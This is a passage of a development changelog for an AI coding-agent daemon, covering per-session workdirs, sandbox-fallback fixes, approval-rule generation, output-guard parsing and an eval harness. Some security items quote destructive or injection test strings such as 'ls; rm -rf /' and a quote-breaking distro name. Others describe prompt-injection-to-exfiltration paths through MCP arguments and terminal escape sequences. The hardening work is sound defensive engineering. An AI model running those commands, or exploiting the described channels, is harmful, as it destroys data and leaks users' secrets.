parallel,ui}.go` and others); the long-lived `acp`/`mcp-serve` stdio bridges defer `Zero` after the
daemon-reachability reassignment so it captures the client actually used; the interactive TUI's
client is scrubbed by `tui.Run` right after `p.Run()` returns. Daemon-side token generation/storage
was left untouched — out of scope for this client-side finding. Tests:
`TestZeroOverwritesBackingBytes` (aliases the backing array before calling `Zero`, asserts every
byte was actually overwritten, not just the field nilled) and `TestZeroSafeOnEmptyClient`, plus a
`-race` run on `internal/client`.

*P26.2 — fixed a `sessionWorkdirs`/`sessionSkills` map leak on session delete.* A fresh regression
in the very P25.1/P25.8 batch that just shipped: `handleCreateSession` (internal/server/sessions.go)
populates `Server.sessionWorkdirs` (P25.1) and `activateSessionSkill` (internal/server/server.go)
populates `Server.sessionSkills` per session, but `handleDeleteSession` only ever called
`s.sessionTools.Delete(id)` — never `sessionWorkdirs.Delete(id)` or `sessionSkills.Delete(id)` — so
both `sync.Map`s grew one entry per deleted session forever on a long-lived daemon. The same
never-evicted-entry shape as the swarm-mailbox leak P8.3 already fixed, just in two more maps.
Fix: `handleDeleteSession` now also calls `s.sessionWorkdirs.Delete(id)` and
`s.sessionSkills.Delete(id)`. Test: new `TestServerDeleteSessionClearsWorkdirAndSkillMaps`
(internal/server/server_test.go) creates a session with an explicit `Workdir`, activates a
built-in skill on it, deletes it, and asserts both maps no longer hold an entry for that session ID
— failed against the pre-fix code, passes now.

*P15.13 — web UI session workdir picker + display.* P25.1 gave sessions a `Workdir` field over the
API, but the web UI never sent one — a browser has no filesystem cwd of its own, so every web
session silently fell back to the daemon's root, P25.1's exact failure mode surviving for the one
client that most needed the fix. Backend: `api.StatusInfo` gained `Workspace` (already added for
P26.1, unused by the frontend until now) and a new `WorkdirAllowlist` field
(internal/api/api.go, internal/server/server.go's `handleStatusInfo`) mirroring
`server.session_workdir_allowlist`, so the picker can suggest directories known to be accepted
instead of guessing blind. Frontend (internal/server/webui/frontend/src): the sidebar's "+ New"
button now expands an inline directory picker (`SessionList.tsx`) — a free-text input backed by a
`<datalist>` of suggestions (the allowlist plus recently-used workdirs, deduped and sorted by
recency, derived client-side from the already-loaded session list — no new endpoint needed for
that half) — sent as `workdir` on `POST /sessions` when non-empty; leaving it blank keeps today's
behavior (the daemon's default workspace, named in the hint text). The chat header
(`app.tsx`'s topbar) now shows a `📁 <workdir>` chip next to the persona/model chip, falling back
to the daemon's workspace label when the session has none. Error handling: `api()`'s shared fetch
wrapper (`api.ts`) now unwraps the daemon's `{"error": "..."}` JSON body into the thrown `Error`'s
message instead of surfacing the raw JSON blob — a small, backward-compatible improvement that
benefits every existing toast, not just this one — so a rejected workdir (nonexistent path, or
outside the allowlist once `server.allow_remote` is set) shows the daemon's actual 400/403 message
in a toast; the picker's "Start chat" button keeps the dialog open (rather than silently falling
back to the default workspace) until the user fixes the path or cancels. Tests: extended
`TestServerStatusEndpoint` (internal/server/server_test.go) to assert `WorkdirAllowlist` round-
trips through `GET /status`. Manually verified end-to-end against a real running daemon over the
raw HTTP API (no browser available in this environment): `POST /sessions` with a valid absolute
workdir creates the session with that `workdir` echoed back and persisted; the same request with a
nonexistent path returns `400 {"error":"workdir does not exist or is not a directory"}` — the exact
message the picker now surfaces instead of a silent fallback.

*P26.1 — `aegis doctor` preflight self-diagnostic.* Each P25 fix addressed one silent-
misconfiguration class the live eval hit (sandbox, workdir, guard, tokens) in its own corner of the
codebase; `doctor` (internal/cli/doctor.go) generalizes the pattern into a single command an
operator runs first. Every check but the last works standalone with no daemon required — a true
preflight, safe to run before `aegis serve` — and prints a PASS/WARN/FAIL row plus a corrective
config key or command for anything short of PASS: **provider** (Ollama `/api/tags` reachability
and configured-model-is-pulled check via the existing `ollamaNativeBase` helper, or a cloud
provider's API key actually present in the environment); **sandbox** (re-runs the exact
`server.SelectSandbox` the daemon calls at startup — the same function the subprocess swarm worker
already reconstructs — so a backend that silently falls back to unsandboxed local, P25.2's bug
class, is caught before the daemon ever starts, not just after); **scanners** (`security.Resolve`
across every *enabled* built-in scanner descriptor — opt-in tools left off are silently skipped,
so an unconfigured DAST/zap scanner isn't a false alarm); **output guard** (warns when
`output_guard.mode: llm` targets a model that looks like a thinking model — an explicit
`provider.think`/`reasoning_effort`, or a name carrying a marker like "-deep"/"deepseek"/"-r1"/
"qwq" — with no `provider.small_model` set, P25.3's failure mode); **workdir allowlist**
(`server.session_workdir_allowlist` posture — a no-op on the default loopback bind, worth flagging
once `server.allow_remote` is set and the allowlist is still empty); and, only if a daemon is
reachable, **daemon** (`/healthz` reachability, degrading to a WARN rather than a FAIL when none is
running), **daemon workspace** (new `Workspace` field on `GET /status`'s `api.StatusInfo`, set from
`Server.workspace` — compared against the CLI's own cwd to catch P25.1's exact failure mode: a
session created with no explicit `Workdir` silently getting the daemon's workspace instead of the
caller's), and **daemon sandbox** (cross-checks the *running* daemon's live
`SandboxFallback`/`SandboxFallbackReason` against what the standalone sandbox check just computed
from the config on disk — a mismatch means the daemon is stale relative to a config edit and needs
a restart). Nonzero exit on any FAIL row so it can gate scripts. Tests
(internal/cli/doctor_test.go): `TestDoctorNamesPodmanMisconfig` reproduces P25.2's exact live-eval
misconfig (`sandbox.backend: podman`, no podman runtime) and asserts both the WARN row and the
named `sandbox.backend` config key; `TestDoctorCleanSetupExitsZero` asserts a nil error (no FAIL
rows) on an unmodified config; `TestLooksLikeThinkingModel`/`TestDoctorGuardCheck`/
`TestDoctorWorkdirCheck`/`TestSamePath`/`TestDoctorProviderCheckMissingAPIKey` cover the pure
per-check logic directly. Manually verified end-to-end against a real running daemon: starting
`aegis serve` from one directory and running `aegis doctor` from another reproduces P25.1's
mismatch and names it correctly, alongside the daemon's own live sandbox-fallback state.

*P25.8 — thread session workdir through the spawn/cron/debate seams.* P25.1 gave top-level
sessions their own working directory, but three seams never received it and kept silently
operating in the daemon's root regardless of which session drove them. (a) **Swarm sub-agents:**
`swarm.SpawnConfig` gained a `Workdir` field; the `agent` tool (internal/tool/builtin/agent.go)
captures the spawning turn's workdir via `tool.WorkdirFromContext` once per `Execute` call and
sets it on every `SpawnConfig` it builds (single-agent, workflow, and debate-mode spawns alike);
`subAgentRunner` (internal/server/server.go) now sets `engine.Options.Workdir` from `cfg.Workdir`
explicitly instead of relying on the parent session's ctx value leaking through — the fix that
actually matters for a detached/background spawn, whose job runs under a context derived from
`context.Background()` (`task.Manager.Start`) and would otherwise silently lose it; the subprocess
backend threads `Workdir` through `WorkerSpec` JSON (already automatic, being a `SpawnConfig`
field) and `internal/cli/worker.go`'s new `resolveWorkerCwd` prefers it over the worker process's
own cwd. (b) **Cron:** `cron.Job` gained an optional `Workdir` field (SQLite migration,
`Scheduler.Create` parameter); `cron_create` (internal/tool/builtin/cron.go) captures the calling
turn's workdir the same way the agent tool does; `cronShellRunner`/`newCronRunFunc`
(internal/server/helpers.go) now take a per-fire `dir` argument that falls back to the daemon's
default cwd when a job carries none. (c) **Debate:** `api.DebateRequest` gained a `Workdir` field
(session-less, so it needs its own — there's no session to inherit from); `handleDebate`
(internal/server/debate.go) validates it through the same `resolveSessionWorkdir` P25.1 uses, and
`debateRoleRunner` sets `engine.Options.Workdir` from it so every role's tool calls — and
`debate.WithFiles`-named fixture paths — resolve against the request's directory instead of always
falling back to the daemon's default workspace. Tests: workdir-propagation coverage across all
three swarm spawn shapes (foreground in-process, background/detached, subprocess) —
`TestAgentToolCapturesSpawningWorkdir`/`TestAgentToolWorkflowCapturesSpawningWorkdir`/
`TestAgentToolDebateCapturesSpawningWorkdir`/`TestAgentToolBackgroundSpawnCarriesWorkdir`
(internal/tool/builtin), `TestSubAgentRunnerUsesSpawnConfigWorkdir` (internal/server),
`TestSubprocessSpawnPropagatesWorkdir` (internal/swarm), `TestResolveWorkerCwdPrefersSpecWorkdir`
(internal/cli); cron round-trip and fire-time propagation —
`TestCronCreateCapturesCallingWorkdir` (internal/tool/builtin),
`TestNewCronRunFuncPassesJobWorkdir` (internal/server), `TestStoreRoundTrip` workdir assertion
(internal/cron); debate — `TestDebateRoleRunnerUsesRequestWorkdir` and
`TestHandleDebateRejectsBadWorkdir` (internal/server).

*P25.7 — promoted the live-eval harness into `internal/eval`.* Every P25 finding above was found
by driving the running daemon over its real HTTP/SSE API against a live local model — the
existing `internal/eval` scenario tier runs a scripted adapter (good for engine-loop regressions,
blind to daemon/sandbox/guard integration) and the `live_eval` tier judges prompt/persona quality
against a bare engine, neither of which touches the seam P25.1–P25.6 actually lived in. Ported
`research/eval-harness-drive.py` to a `live_workflow`-tagged Go test
(`internal/eval/live_workflow_test.go`, `TestLiveWorkflow`): it writes the seeded-bug
`temps.py`/`temps.csv` fixture, `chdir`s into it (mirroring the harness recipe's `cd
<target-project> && aegis serve` — the exact "daemon cwd wrong" failure mode P25.1 fixed), builds
a real daemon via `server.New` (full production wiring, not the synthetic `newWithDeps` other
`internal/server` tests use) served over an in-process `httptest.Server`, and drives it with
`internal/client.Client` — the same HTTP/SSE seam the TUI and web UI use. Three subtests assert
workflow-shape invariants rather than golden text: `FixSeededBug` (guard off) checks the task
actually completed (re-running the fixture script itself rather than trusting the model's claim),
≥2 shell calls (initial run + verification re-run), no `web_search`/`web_fetch`/`find /`-style
detours, a tool-call ceiling, no unrequested files or `remember` calls (P25.6), non-zero token
usage on `done` (P25.5), and ≤2 approval requests under auto-approve (P25.4); `GuardNoMetaLeak`
(guard on) checks the final answer never leaks PASS/FAIL/VERDICT meta-text (P25.3);
`LocalPromptProfileReducesFirstTurnTokens` runs an identical trivial prompt against a `local`- and
a `default`-profile daemon and asserts the local profile's first-turn input tokens are strictly
lower (P25.6). On-demand only, gated behind the `live_workflow` build tag, same
no-scheduled-CI-job policy as `live_eval` — documented next to it in CLAUDE.md. Skips (not fails)
when no `python3`/`python` is on PATH, since a missing interpreter is an environment gap, not a
regression.

*P25.4 — approval ergonomics: dead hotkeys, bad generated rules, read-only shell gating.* Three
independent frictions from the live TUI run, all approval-related. (a) **Dead `y` hotkey:** the
approval dialog already short-circuited key handling, but the "Steer the model" composer stayed
visually focused (blinking cursor) and could still intercept input on some message types. Fixed
by blurring the composer the instant a dialog opens and refocusing it on every resolution path
(answer or run-abort); the shared textarea-update path is skipped entirely while a dialog is up,
and the status bar shows "⏸ respond to the approval dialog above" so focus state is visible.
(b) **Generated Allow-always rules:** `suggestRulePattern`/new `suggestShellPattern`
(internal/tui/approval.go) now strip a leading `cd <dir> &&` and env-var prefixes before keying
the suggestion on binary + subcommand (`git status*`, not the old useless
`cd ... && python3 temps.py*`), and refuse to emit any pattern containing a
redirection/pipe/substitution/chaining metacharacter — those fall back to "once only — no safe
rule; write one by hand" rather than ever baking in something like `shell(cat >*)`.
(c) **Read-only shell gating:** a new classifier (`internal/tool/builtin/shell_readonly.go`)
allowlists read-only argv[0]+flag shapes (`ls`, `cat`, `head`, `tail`, `wc`, `pwd`, `stat`,
`file`, PowerShell read cmdlets, `git status`/`log`/`diff` without config-override flags) and
rejects outright on any shell metacharacter; wired through a new optional
`tool.CapabilityOverrider` interface and `tool.EffectiveCapability` helper consumed by
`permission.Gate.Check`, `engine.serializeTool`, and secret redaction — the shell tool's static
`Capability()` (used for rule subject-matching) is untouched, so deny rules against `shell` still
block a read-classified call. Tests: `TestApprovalDialogTakesKeyPriorityOverComposer`, table-driven
rule-generation tests (cd/env stripping, metacharacter refusal), and classifier bypass-attempt
tests (`cat f > /etc/x`, `git -c core.pager=sh log`, `ls; rm -rf /` all correctly rejected).

*P25.5 — token-usage observability for local providers.* Every API-driven run reported
`done in=0 out=0` on the SSE `done` event while the TUI status bar showed live counts for the
same engine, because `internal/engine/engine.go`'s terminal `KindDone` emission
(`emit(Event{Kind: KindDone})`) carried no usage at all — per-turn estimated usage
(`provider.Usage`, `IsEstimated`) was already computed and emitted on each `KindTurnDone` event,
but only the TUI's live status bar read it. `Run()` now accumulates each turn's usage (real or
character-estimated) as turns complete, tracking whether any contributing turn lacked real
provider-reported usage, and attaches the accumulated `*provider.Usage` to the final `KindDone`
event — `IsEstimated` set accordingly, passed through the existing `toAPIEvent`/`TokensEstimated`
wiring unchanged. `internal/server/messages.go` was already folding every `KindTurnDone`'s usage
into session totals (a pre-existing P10.5 path), so `SessionMeta` needed no change — just test
coverage confirming it. Tests: `TestDoneEventCarriesEstimatedUsage` (engine),
`TestDoneEventAndSessionMetaCarryEstimatedTokens` (server, full HTTP/SSE round-trip with a
zero-usage adapter). Live-harness verification against a real Ollama daemon (confirming the
eval-harness summary now shows non-zero in/out) is deferred to the next live-eval session.

*P25.6 — local-model profile: prompt weight + scope-creep guardrails.* The first model call
carried ~10k input tokens (system prompt + always-exposed tool schemas + repo map + skills
preamble) before the user said a word, and `qwen3coder:30b` over-delivered on a simple bug-fix
task (unrequested try/except robustness, an unrequested summary file, an unprompted `remember`
call) because nothing in the prompt said not to. Shipped: (a) `config.ProviderConfig` gained
`PromptProfile` (`prompt_profile: local|default|auto`, default `auto`) and
`LocalPromptProfile() bool`, which auto-detects from `base_url` (new `isLoopbackBaseURL` helper:
`localhost`/`127.0.0.1`/`::1`, with or without port, http/https) unless explicitly overridden.
`internal/tool/builtin/builtin.go` gained `Options.LocalProfile`: under the local profile,
`git_pr`/`web_fetch`/`web_search`/`security_scan` move from always-exposed (`reg.Register`) to
deferred (`reg.RegisterDeferred`, loaded on demand via `tool_search`) — the default profile is
unaffected. `effectiveSystem` (internal/server/helpers.go) now skips injecting the repo map when
it exceeds `localRepoMapMaxBytes` (4000) under the local profile only. (b) Two new rules were
added to the shared `toolUseBlock`/`completingTasksBlock` (internal/persona/persona.go, injected
into every session regardless of persona or profile): prefer local file tools over network tools
for file-scoped tasks, and don't write files/call `remember`/add unrequested robustness beyond
what was explicitly asked. Both new rules apply to every profile, not just local. Tests:
`TestProviderConfig_LocalPromptProfile` (14-case detection table),
`TestRegisterLocalProfileDefersNetworkAndScanTools`,
`TestToolUseBlock_preferLocalOverNetwork`/`TestCompletingTasksBlock_noScopeCreep`, and
`TestEffectiveSystem_localProfileTrimsPrompt` (oversized repo map dropped under a loopback
`base_url` but kept under a remote one; local prompt strictly shorter; both profiles still carry
the two new shared rules). Actual latency/instruction-following measurement needs the P25.7
harness — deferred, per that item's acceptance criteria.

*P25.3 — output guard vs local/thinking models.* In the live eval, a correct answer from
`qwen3.6:35b-a3b-deep` with the default `output_guard.enabled: true` + `mode: llm` tripled turn
time (26 s → 78 s): the verdict failed to parse, fail-closed forced a corrective retry that
re-ran tools, the retry's verdict failed to parse again, and the surfaced answer opened with
leaked meta-text ("**PASS.** The fix is confirmed working…") because the retry answered the
guard instead of the user. Shipped, four parts. (a) **Verdict parsing symmetry**
(internal/guard/guard.go): the old parser matched PASS only at position 0 but FAIL anywhere, so
a thinking model's reasoning preamble fail-closed nearly every *passing* verdict. `parseVerdict`
now recognizes a verdict at the reply's start OR on its last non-empty line (tolerating
markdown emphasis and a "VERDICT:" label, via `verdictAt`), after stripping `<think>` **and**
`<thinking>` blocks; FAIL-anywhere still counts as a failure, PASS mid-sentence is still never
trusted ("does not PASS the rubric"), and a genuinely ambiguous reply still fails closed — the
asymmetry was the bug, not the strictness. (b) **SmallModel routing** (new
`Server.guardModel`, internal/server/engine_build.go): guard verdict calls now run on
`provider.small_model` when set — the same preference session titles and compaction already
had — so a fast non-thinking judge makes the strict "reply exactly PASS" contract satisfiable;
falls back to the session model otherwise. (c) **Retry replaces, not appends, the visible
answer**: the engine's failed-guard-with-retry event is flagged `GuardRetrying`
(engine.Event/api.Event `guard_retrying`, threaded through `toAPIEvent`); the TUI now flushes
assistant answers via `AppendBlock` and, on a retrying guard event, rewrites the failed
answer's transcript item in place to a dim "answer withdrawn — retrying" note
(`SetItemRaw`) so the retry renders as *the* answer; and after the run settles, the engine's
new `retractGuardCorrectives` strips each failed answer + corrective prompt from the
conversation (content-keyed on `guardCorrectivePrefix`, immune to mid-run
compaction/prepare-step index drift; tool rounds a retry ran are kept), setting
`Persisted = -1` so the server's existing flush path re-saves the cleaned transcript — durable
history and later model context hold only the answer the user actually saw. The corrective
prompt itself now ends by forbidding any mention of the validation step or PASS/FAIL verdict
words, closing the leak. TUI pass events (empty reason) no longer print a stray "⚠ output
guard:" line. (d) **`--first-init` template** (internal/cli/init.go): the Ollama-flavored
global config now ships `output_guard.enabled: false` with a comment explaining the latency
economics, plus a `small_model` hint in the provider block; built-in defaults are unchanged
(`enabled: true` for configured/cloud setups), and `/guard on` still enables per session. Web
UI ignores guard events (parity no-op), so no frontend change. Tests:
`TestParseVerdictShapes` (16-case table incl. reasoning preambles, verdict-on-last-line,
negated PASS, unclosed think block), engine `TestGuardRetryReplacesVisibleAnswer` /
`TestGuardExhaustedRetractsIntermediateAttempts` (retraction + `GuardRetrying` flag +
`Persisted=-1`), the two corrective-prompt tests reworked to observe the model-visible request
via a capturing adapter (the corrective no longer survives in `conv.Messages` — that's the
feature), `TestGuardModelPrefersSmallModel`, `TestToAPIEventGuard` retry-flag round-trip, and
the template test now asserting disabled-but-configured. Acceptance beyond unit tests (guard-on
latency ≤ ~15 % vs guard-off on the seeded-bug task) needs the live harness — re-run
`research/eval-harness-drive.py` with guard on next live-eval session; the P25.7 suite locks
the "no PASS/FAIL meta-text in the final answer" invariant.

*P25.1 — per-session working directory.* A TUI session started in directory X against a daemon
started in directory Y displayed `Dir X` in the welcome screen but executed every tool in Y — in
the live eval the agent answered `git status` from the wrong repo, concluded the target file
didn't exist, web-searched, then ran `find /`; `read_file` with the session dir's absolute path
was refused (outside workspace root), pushing the model to shell `cat`/`ls` and an approval prompt
each time. Root cause: `internal/server/server.go` captured `os.Getwd()` once at daemon startup
and that single value became the tool workspace root, `s.workspace`, memory/repo-map/LSP/knowledge
roots, persona/command discovery dirs, and sandbox `ExecOpts.Dir`; sessions had no workdir of
their own, and `aegis chat` (in-process engine rooted at the caller's cwd) masked the bug by
behaving differently from the TUI against the same daemon.
Shipped: rather than a per-root `tool.Registry` cache — which would mean reconnecting MCP servers,
re-registering plugins, and rebuilding the swarm/agent tool once per distinct session directory —
the daemon keeps one shared, MCP/plugin/swarm-wired registry and threads the session's workdir
through `context.Context` (`tool.WithWorkdir`/`tool.WorkdirFromContext`, mirroring the existing
`tool.WithRegistry` pattern `tool_search` already relied on). `engine.Options.Workdir` sets it
once per turn (`executeTool`, right next to `tool.WithRegistry`); every workspace-confined tool
(file ops, `ls`/`glob`/`grep`, git, `shell`, security/diagram/latex/dast/recon tools,
`remember`/`save_skill`, background shell jobs) resolves its effective root from that context
value, falling back to its own construction-time root when unset. `sandbox.ExecOpts.Dir` was
already per-call for the local and container backends, so this reaches the shell tool with no
sandbox-package changes. `CreateSessionRequest`/`SessionMeta`/`session.Session`/`session.Meta`
gained `Workdir`; the session store persists it via the same idempotent
`ALTER TABLE ... ADD COLUMN` pattern as the P14.7 `Model` field. `handleCreateSession` resolves
and validates it (must exist, be a directory) and enforces the trust boundary: a new
`server.session_workdir_allowlist` config key (alongside `server.allow_remote`) restricts a
remote-accessible daemon to the daemon's own workspace or an explicitly allowlisted root;
loopback-only daemons (the default) accept any existing directory, matching today's trust model.
TUI (`internal/cli/root.go`) sends its cwd on create and prefers a resumed session's own
persisted `Workdir` over the local cwd; ACP (`internal/acp/agent.go`) now forwards the
`session/new` `cwd` param it was previously parsing and discarding. `aegis chat`, the web UI,
`mcp-serve`, and `parallel.go` are unchanged.
Deliberately deferred (documented gap, not a silent one): `lsp.Manager`, `knowledge.Store`,
`longmem.Store`, the cached repo-map (`s.repoMap`), and persona/command/agent-def directory
discovery all remain scoped to the daemon's own default workspace regardless of a session's
Workdir — each is a daemon-wide singleton today (one set of language servers, one knowledge DB,
etc.) and re-scoping them per session is a materially larger change nothing yet requires.
`sandbox.OSBackend` (seatbelt/bwrap) also bakes its write-confinement profile to the daemon's
workspace at construction — a session on a different Workdir under the `os` sandbox backend won't
get write access extended to its own directory; `resolveSessionWorkdir` logs a one-time warning
when this combination is detected. Revisit if a concrete pain point shows up in a future
live-eval pass. Tests: `internal/engine/workdir_test.go`, session-store persistence and
workdir-validation coverage in `internal/server`.

*P25.2 — sandbox backend name trap + untruthful `/config/sandbox`.* `sandbox.backend: podman` (or
`docker`) was accepted everywhere — config file, `AEGIS_SANDBOX_BACKEND`, `PATCH /config/sandbox`
— and `GET /config/sandbox` echoed it back, but `SelectSandbox` switched only on
`"container" | "auto" | "os"`, so anything else silently hit `default:` → local backend: execution
ran on the **host, unsandboxed**, and with `auto_approve_exec: true` (the exact combo the docs
suggest for containerized auto-runs) every shell command ran on the host unprompted. Verified
live: host-path tracebacks until the backend was respelled, `/workspace` tracebacks after.
Shipped: (a) `config.SandboxConfig.Normalize()` (internal/config/config.go), called from
`config.Load()` and reused by the `PATCH /config/sandbox` handler, aliases
`docker`/`podman`/`wsl`/`wslc`/`apple` → `backend: container` + the matching `runtime` (an
explicit `runtime` already set is preserved) and hard-errors on any other unrecognized `backend`
value naming the offending value and the correct keys; `SelectSandbox`
(internal/server/server.go) also hardened its own `default:` case as defense-in-depth for any
`SandboxConfig` built outside `config.Load()`. (b) `api.ConfigSandboxResponse` gained
`active_backend`/`fallback`/`fallback_reason`; both `/config/sandbox` handlers now report the
daemon's actual `s.sandbox.Name()` and `s.sandboxFallback(Reason)` alongside the configured
values, verified live (`AEGIS_SANDBOX_BACKEND=podman` with no podman installed correctly reports
`active_backend: "local", fallback: true` with the underlying error as the reason). (c) new
`permission.allow_unsandboxed_auto_exec` config key (default false); daemon startup now refuses
to start (`unsandboxedAutoExecError` in server.go) when `auto_approve_exec: true` and the
effective backend is local, unless the opt-out is set — verified live, including the opt-out
downgrading back to a WARN. (d) web UI: `StatusInfo`/new `ConfigSandboxResponse` TS types gained
the fallback fields; the sidebar's "Security check" button now shows a warning badge when
`/status` reports `sandbox_fallback`, and the Security panel gained a read-only "Sandbox" tab
(`SandboxSection` in SecurityPanel.tsx) showing configured vs. active backend and the fallback
reason via `GET /config/sandbox`; frontend rebuilt and `dist/` committed. Tests:
`internal/config/sandbox_normalize_test.go` (alias/validation table),
`internal/server/sandbox_test.go` (`/config/sandbox` reflects the active backend + fallback
reason), `internal/server/sandbox_startup_test.go` (auto-approve + local-sandbox startup refusal
and the opt-out).

Earlier — **P15.3–P15.10 — web UI parity with the TUI (batches A, B,
C) and P24.14 (FIND-12) — MCP outbound tool-call argument flow.** The Tier 3 pass, four ships in one
day; P15.2's config-mutation endpoints and P15.12's token hardening had already landed, so all three
web-UI batches were frontend work against existing daemon APIs (plus two small wire-shape additions
in batch C, below). P15.11's plain-language framing was the design lens throughout — every panel
speaks user language ("Stress-test a claim", "What the assistant remembers", "Accepted risks"), not
subsystem language.

*Batch A (`d8fc58e`, P15.3–P15.5, P15.10):* "Assistant" topbar chip opens a persona picker with
plain-language descriptions (GET /personas), switching via PATCH on the session, with a per-chat
model override behind an "Advanced" disclosure; persistent cost/token readout in the topbar (this
chat + today's totals, caps in the tooltip) refreshed after every run, and `cost_alert` SSE events —
previously dropped — surfaced as warning toasts; "Restore" chip lists per-turn restore points with
an inline destructive-action confirmation before POST /rewind; approval prompts gained a "Don't ask
again for requests like this" checkbox with an editable pattern (allow_always/pattern on approve),
pre-filled by a TS port of the TUI's `suggestRulePattern` (command prefix / file directory / URL
host).

*Batch B (`eb5a14c`, P15.8–P15.9):* debate ("stress-test a claim") and project-knowledge panels as
sidebar tools; archived-chats tab with archive/restore, prune-old-chats with confirmation,
background-session toggle plus reattach-to-a-running-response via the buffered-events endpoint, and
a daemon-wide activity view (runs + teammates).

*Batch C (`05ca71f` merge of `8686c42`/`bc38dd3`, P15.6–P15.7):* the last two panels, built **in
parallel by two sub-agents in isolated git worktrees** (disjoint backend files, overlapping only on
the frontend seams — `app.tsx`/`types.ts`/`SessionList.tsx`/`style.css` — resolved additively at
merge). P15.6 ("Security check"): scanner-status list from GET /security/status with the two-phase
guided-install flow preserved (POST /security/install first shows the exact host command, only an
explicit second confirm click runs it), run-a-scan with a severity-sorted findings table
(expandable description/remediation/CWE/ASVS rows, skipped-scanner reasons, suppressed count, raw
report in a collapsible), and the accepted-risk baseline as a read-only table with
active/expired/invalid badges. Its backend half: `api.ScanResponse` — previously just the formatted
text `report` — gained structured fields mirroring `security.Report` (`api.ScanFinding` mirrors
`security.Finding`, same mirror-not-import convention as `SecurityBaselineEntry`), populated for
workspace/path, image, and recon scans in `handleScan`. P15.7 ("Skills & memory"): project/user
memory as read-only views with per-scope "Add a note" composers (POST /memory), the
currently-usable playbook list, and a built-in-skills toggle list with a project/global scope
selector and an explicit dirty-tracking Save that always sends the complete set (PATCH
/config/skills is deliberately full-replace). Its backend half: `ConfigSkillsResponse` gained an
`available` catalog (name + description per embedded built-in, from `skills.Builtins()`) so the
toggle UI doesn't hardcode the skill list.
Tests: new `TestHandleScanReturnsStructuredFields` (pins trufflehog so the ran/skipped/findings
shape is deterministic regardless of installed binaries), extended
`TestConfigSkillsGetAndPatchRoundTrip` (catalog present, PATCH echoes it); `go build ./...` clean
and `go test ./...` shows only the pre-existing machine-specific failures, verified identical on
the pre-merge base commit in a throwaway worktree; frontend `tsc` + vite build clean, `dist/`
rebuilt once after the merge and committed.

*P24.14 (`73880ae`, FIND-12):* tool-call arguments are model-constructed and forwarded verbatim to
whichever MCP server the call targets, making an untrusted server an exfiltration channel for
anything the model has read into context. docs/mcp-trust-boundary.md gained an outbound section
(§3) covering the data flow, the injection→exfiltration composition, and how to evaluate configured
servers; new per-server opt-in `scan_arguments` (default false, the outbound mirror of
`scan_output`) checks tools/call, resources/read, and prompts/get arguments against a small
conservative credential-shaped pattern set (PEM keys, AWS key IDs, sk-/GitHub/Slack tokens, JWTs,
bearer tokens, api_key/password assignments) in `internal/mcp/outbound.go`. A hit logs a Warn
naming the server, tool, and pattern class — never the matched text — and is flag-only, never
blocking or mutating the call, matching the inbound scan philosophy. Table-driven tests cover
pattern coverage, off-by-default no-op, warn-and-proceed, and the resource/prompt adapters.

Earlier — **P24.20 (FIND-17) — strip/escape ANSI/OSC control sequences in
streamed model output before TUI render.** Flagged by the STRIDE-A threat model as defense-in-depth
for an already-mitigated prompt-injection vector: if adversarial content ever reached the model's
output verbatim, the TUI's markdown render path had no sanitization step, so embedded raw ANSI/OSC
escape sequences could reach the terminal — cursor repositioning, hidden/overwritten text, or
OSC-based clipboard/title-bar tricks on terminals that support them. `internal/tui/tui.go`'s
`mdRender` (the single choke point both the mid-stream `liveBlock.render` and end-of-turn
`flushLiveText` route through) renders raw model text via glamour or, on renderer failure, a plain
`wrap` fallback — neither strips unrelated escape sequences embedded in the source text. Added
`stripControlSeqs` in a new `internal/tui/sanitize.go`, a byte-scanner that strips CSI sequences
(`ESC [ … <final byte>`), OSC/DCS/APC/PM sequences (`ESC ] … (BEL | ESC \)` and similar,
BEL/ST-terminated), bare/other 7-bit C1 two-byte escape forms, and raw C0 control bytes (except
tab/LF/CR) and DEL, while leaving printable text — including multi-byte UTF-8 — untouched; called at
the top of `mdRender` before both the glamour and fallback paths, so the sanitization happens on the
untrusted input rather than only on glamour's own (trusted) styled output. Deliberately separate from
`internal/tui/ansi16.go`'s `remapANSI16`, which remaps SGR colour codes in already-trusted shell-tool
output and preserves them by design (`internal/tui/toolview.go`'s tool-result rendering path) — that
path was left untouched since it isn't the vector the finding describes.
Tests: new `internal/tui/sanitize_test.go` (`TestStripControlSeqs`, table-driven — cursor-
repositioning CSI, SGR color CSI, OSC terminal-title and OSC-8 hyperlink/OSC-52 clipboard sequences,
bare ESC, C0 controls, DEL, an unterminated trailing OSC, and markdown/unicode passthrough — plus
`TestStripControlSeqsIdempotent`). `go build ./...`, `go test ./internal/tui/...`, and
`go test -race ./internal/tui/...` all clean; `go test ./...` shows only pre-existing, unrelated
failures (Windows-path-format assertions in `internal/sandbox`/`internal/security`/`internal/lsp` and
network-timeout flakes in `internal/server`) that reproduce identically on `main` before this change.

Earlier — **P24.22 — quote/escape the `distro` argument in
`sandbox.WSLInstallCommand`.** Flagged by the STRIDE-A threat model as a latent injection vector:
`WSLInstallCommand` (`internal/sandbox/wsl.go`) already quoted its `linuxCmd` argument with
`bashQuote` (correct, since that portion is embedded inside the inner `bash -lc '...'`), but
concatenated `distro` directly into the command line unquoted — `"wsl -d " + distro + " -- ..."`.
Currently dead code from a security-impact standpoint (the only call site,
`internal/security/install.go:42`, hardcodes `distro` to `""`), but worth closing before a second,
config-driven caller turns it into a real injection vector. The whole returned string is parsed by
PowerShell first (`shellInvocation` runs it via `<pwsh-or-powershell> -NoProfile -NonInteractive
-Command <command>`, which then invokes `wsl.exe -d <distro> -- bash -lc '...'`), so `distro` needed
PowerShell single-quote escaping, not bash quoting — doubling any embedded single quote, no
backslash escape. Added `powershellQuote` next to the existing `bashQuote` in
`internal/sandbox/wsl.go` and applied it to the `distro` argument only; `linuxCmd`/`bashQuote` is
unchanged.
Tests: `internal/sandbox/wsl_test.go`'s `TestWSLInstallCommandWithDistro` updated to expect the
now-quoted `'kali-linux'`, plus a new `TestWSLInstallCommandQuotesDangerousDistro` asserting a
distro name containing a single quote and a semicolon (`kali'; rm -rf C:\ ; '`) is safely escaped
rather than breaking out of the PowerShell argument. `go build ./...` and
`go test ./internal/sandbox/...` clean (pre-existing, unrelated `-race` failures on this machine —
macOS `/private/var` symlink resolution in `TestValidatePath*` and a flaky
`TestWSLPathConvertsBackslashesViaForwardSlash` — reproduce identically on `main` before this
change).

Earlier — **P24.15 (FIND-14) — give each swarm sub-agent a guaranteed
minimum budget floor.** `internal/swarm/subprocess.go`'s `SubprocessBackend.Spawn` computed each
worker's remaining cost/token allowance as the shared fan-out tracker's cap minus whatever siblings
had already spent, floored only at a near-zero epsilon (`minRemainingBudgetUSD`/
